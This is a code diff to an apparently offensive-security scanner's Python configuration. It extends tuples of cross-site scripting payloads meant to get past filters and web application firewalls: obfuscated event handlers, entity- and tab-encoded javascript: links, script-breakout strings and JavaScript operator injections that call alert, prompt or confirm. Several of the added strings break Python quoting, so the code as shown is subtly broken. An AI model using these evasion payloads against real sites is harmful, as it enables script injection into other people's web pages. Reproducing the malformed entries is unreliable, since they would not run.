@@ -61,7 +61,15 @@ payloads = (  # Payloads for filter & WAF evasion
     '\'"><y///oNMousEDown=((confirm))()>Click',
     '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
     '<img src=x onerror=confir\u006d`1`>',
-    '<svg/onload=co\u006efir\u006d`1`>')
+    '<svg/onload=co\u006efir\u006d`1`>',
+    '<svg/OnLoad="`${prompt``}`">',
+    '1'"><img/src/onerror=.1|alert``>',
+    '<svg onload=prompt%26%230000000040document.domain)>',
+    '<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f',
+    '<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>',
+    '</script><svg><script>alert(1)-%26apos%3B',
+    '<img src=x onerror=alert('XSS');>',
+    'img src=x onerror=alert(String.fromCharCode(88,83,83));>')
 
 fuzzes = (  # Fuzz strings to test WAFs
     '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
@@ -69,7 +77,11 @@ fuzzes = (  # Fuzz strings to test WAFs
     '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
     '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
     '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
-    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')
+    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>', '<svg/onload=%26nbsp;alert`bohdan`+', '<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f',
+    '<sCrIpt>alert(1)</ScRipt>', '<script x>alert('XSS')<script y>', '</script><script>alert(1)</script>', '<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>',
+    '<script>window['alert'](document['domain'])</script>', ''te' * alert('*') * 'xt';', ''te' / alert('/') / 'xt';', ''te' % alert('%') % 'xt';', ''te' - alert('-') - 'xt';',
+    ''te' + alert('+') + 'xt';', ''te' ^ alert('^') ^ 'xt';', ''te' == alert('==') == 'xt';', ''te' | alert('|') | 'xt';', ''te' ? alert('ifelsesh') : 'xt';',
+    ''te' in alert('in') in 'xt';', ''te' instanceof alert('instanceof') instanceof 'xt';')
 
 headers = {  # default headers
     'User-Agent': '$',
